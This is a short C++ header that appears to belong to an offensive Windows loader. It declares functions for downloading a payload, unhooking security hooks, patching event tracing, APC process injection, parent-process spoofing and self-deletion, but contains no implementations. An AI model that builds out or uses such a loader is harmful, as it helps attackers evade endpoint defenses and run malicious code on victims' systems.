#pragma once
#include <vector>
#include <Windows.h>

// Functions definitions
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
DWORD GetPID();
void fresh_unhooking();
void perunsfart_unhooking();
void evt_patch();

void EnumPageExec();
void Indirect_RawExec_ppid(DWORD exPID);
void IndirectAPC();
void IndirectRemoteAPC(DWORD exPID);
void execArtifact(DWORD exPID);

BOOL DeleteSelf();


